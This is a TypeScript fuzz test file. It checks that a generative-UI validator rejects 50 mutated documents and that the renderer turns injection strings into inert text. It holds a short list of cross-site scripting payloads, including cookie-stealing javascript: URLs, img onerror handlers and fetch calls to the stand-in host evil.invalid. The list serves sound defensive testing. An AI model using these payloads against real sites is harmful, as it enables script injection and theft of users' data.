/**
 * Fuzz-ish adversarial proof: 50 deterministic mutations of valid documents —
 * component-name typos, illegal props, injected event handlers, styling
 * escape hatches, vocabulary violations, structure bombs, and script-y
 * strings. Every mutation must be REJECTED by the validator, or (for
 * injection payloads that are legal strings) render INERT: no script/iframe
 * elements, no javascript: URLs, no inline handlers in the DOM.
 */

import { render } from '@testing-library/react';
import React from 'react';
import { describe, expect, it } from 'vitest';
import { validateDocument } from '../src/validate.js';
import { GenUIScreen } from '../src/GenUIScreen.js';
import { LIMITS, type GenUIDocument, type GenUINode } from '../src/schema.js';
import { docOf, registries } from './helpers.js';

/* Deterministic PRNG (mulberry32) — same 50 documents every run. */
function mulberry32(seed: number): () => number {
  let a = seed;
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const SCRIPTY_STRINGS = [
  '<script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  'javascript:alert(document.cookie)',
  '{{constructor.constructor("return this")()}}',
  '</style><script>fetch("https://evil.invalid")</script>',
];

function baseDoc(): GenUIDocument {
  return docOf(
    {
      layout: 'stack',
      gap: 'md',
      children: [
        { text: 'Account', role: 'heading2' },
        { component: 'TextField', props: { label: 'Email', intent: 'set-email' } },
        { component: 'Button', props: { variant: 'primary', intent: 'save' }, children: ['Save'] },
        { component: 'Badge', props: { tone: 'info' }, children: ['Beta'] },
      ],
    },
  );
}

interface Mutation {
  name: string;
  /** true when the mutated document is still VALID and must render inert. */
  expectInert?: boolean;
  apply(rand: () => number): GenUIDocument;
}

function typo(name: string, rand: () => number): string {
  const i = 1 + Math.floor(rand() * (name.length - 2));
  return name.slice(0, i) + name.slice(i + 1); // drop a letter
}

const componentNames = registries.components.components.map((c) => c.name);

const MUTATIONS: Mutation[] = [
  {
    name: 'component-name-typo',
    apply(rand) {
      const victim = componentNames[Math.floor(rand() * componentNames.length)] as string;
      return docOf({ component: typo(victim, rand), children: ['x'] });
    },
  },
  {
    name: 'hallucinated-layout-primitive',
    apply(rand) {
      const names = ['Box', 'Stack', 'Flex', 'Grid', 'Container', 'Spacer'];
      return docOf({
        component: names[Math.floor(rand() * names.length)] as string,
        props: { p: 4 },
        children: [],
      });
    },
  },
  {
    name: 'hallucinated-typography',
    apply(rand) {
      return docOf({
        component: rand() < 0.5 ? 'Heading' : 'Text',
        props: rand() < 0.5 ? { level: 2 } : { size: 'sm' },
        children: ['Title'],
      });
    },
  },
  {
    name: 'illegal-prop',
    apply(rand) {
      const junk = ['color', 'href', 'dangerouslySetInnerHTML', 'as', 'sx'];
      const doc = baseDoc();
      const button = findComponent(doc, 'Button');
      (button.props as Record<string, unknown>)[junk[Math.floor(rand() * junk.length)] as string] =
        'x';
      return doc;
    },
  },
  {
    name: 'injected-event-handler',
    apply(rand) {
      const handlers = ['onPress', 'onClick', 'onChange', 'onLoad', 'onFocus'];
      const doc = baseDoc();
      const button = findComponent(doc, 'Button');
      (button.props as Record<string, unknown>)[
        handlers[Math.floor(rand() * handlers.length)] as string
      ] = 'fetch("https://evil.invalid")';
      return doc;
    },
  },
  {
    name: 'styling-escape-hatch',
    apply(rand) {
      const doc = baseDoc();
      const button = findComponent(doc, 'Button');
      if (rand() < 0.5) (button.props as Record<string, unknown>)['className'] = 'p-4 bg-red-500';
      else (button.props as Record<string, unknown>)['style'] = { position: 'fixed', inset: 0 };
      return doc;
    },
  },
  {
    name: 'illegal-variant-value',
    apply(rand) {
      const values = ['link', 'outline', 'subtle', 'tertiary', 42, true];
      const doc = baseDoc();
      const button = findComponent(doc, 'Button');
      (button.props as Record<string, unknown>)['variant'] =
        values[Math.floor(rand() * values.length)];
      return doc;
    },
  },
  {
    name: 'layout-vocab-violation',
    apply(rand) {
      const gaps = ['13px', '2rem', 'var(--ds-space-4)', 'calc(1rem+2px)', 'xl'];
      return docOf({
        layout: 'stack',
        gap: gaps[Math.floor(rand() * gaps.length)] as string,
        children: [],
      });
    },
  },
  {
    name: 'intent-on-static-component',
    apply() {
      const doc = baseDoc();
      const badge = findComponent(doc, 'Badge');
      (badge.props as Record<string, unknown>)['intent'] = 'boom';
      return doc;
    },
  },
  {
    name: 'depth-bomb',
    apply() {
      let node: GenUINode = { text: 'deep' };
      for (let i = 0; i < LIMITS.maxDepth + 8; i++) node = { layout: 'stack', children: [node] };
      return docOf(node);
    },
  },
  {
    name: 'node-bomb',
    apply() {
      const nodes: GenUINode[] = [];
      for (let i = 0; i <= LIMITS.maxNodes; i++) nodes.push({ component: 'Badge', children: ['x'] });
      return docOf(...nodes);
    },
  },
  {
    name: 'element-prop-smuggling',
    apply() {
      return docOf({
        component: 'Dialog',
        props: { title: 'X', trigger: { component: 'Button', children: ['Open'] } },
        children: [{ text: 'Body' }],
      });
    },
  },
  {
    name: 'scripty-string-payload',
    expectInert: true, // legal strings — must render as inert text
    apply(rand) {
      const payload = SCRIPTY_STRINGS[Math.floor(rand() * SCRIPTY_STRINGS.length)] as string;
      return docOf(
        { text: payload, role: 'body' },
        { component: 'Alert', props: { title: payload }, children: [payload] },
        { component: 'Button', props: { intent: 'save' }, children: [payload] },
      );
    },
  },
];

function findComponent(doc: GenUIDocument, name: string): { props?: Record<string, unknown> } {
  const stack: unknown[] = [...doc.screen.nodes];
  while (stack.length > 0) {
    const node = stack.pop();
    if (typeof node !== 'object' || node === null) continue;
    const record = node as Record<string, unknown>;
    if (record['component'] === name) {
      if (!record['props']) record['props'] = {};
      return record as { props: Record<string, unknown> };
    }
    if (Array.isArray(record['children'])) stack.push(...(record['children'] as unknown[]));
  }
  throw new Error(`fuzz helper: no <${name}> in base doc`);
}

describe('fuzz: 50 mutated documents, all rejected or inert', () => {
  const rand = mulberry32(0xa11d5);
  const runs: { mutation: Mutation; doc: GenUIDocument }[] = [];
  for (let i = 0; i < 50; i++) {
    const mutation = MUTATIONS[i % MUTATIONS.length] as Mutation;
    runs.push({ mutation, doc: mutation.apply(rand) });
  }

  it('generates 50 deterministic mutations', () => {
    expect(runs).toHaveLength(50);
  });

  runs.forEach(({ mutation, doc }, i) => {
    it(`#${String(i + 1).padStart(2, '0')} ${mutation.name}: ${mutation.expectInert ? 'renders inert' : 'rejected'}`, () => {
      const result = validateDocument(doc, registries);
      if (!mutation.expectInert) {
        expect(result.valid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
        return;
      }
      // Injection payloads are legal STRINGS: the document validates, and the
      // rendered DOM must contain them only as escaped text.
      expect(result.errors).toEqual([]);
      const { container, unmount } = render(
        React.createElement(GenUIScreen, { doc, registries, bindings: { save: () => {} } }),
      );
      try {
        expect(container.querySelector('script')).toBeNull();
        expect(container.querySelector('iframe')).toBeNull();
        expect(container.querySelector('img')).toBeNull();
        expect(container.innerHTML).not.toContain('javascript:');
        for (const el of Array.from(container.querySelectorAll('*'))) {
          for (const attr of Array.from(el.attributes)) {
            expect(attr.name.toLowerCase().startsWith('onerror')).toBe(false);
            expect(attr.name.toLowerCase()).not.toBe('onclick');
          }
        }
      } finally {
        unmount();
      }
    });
  });
});
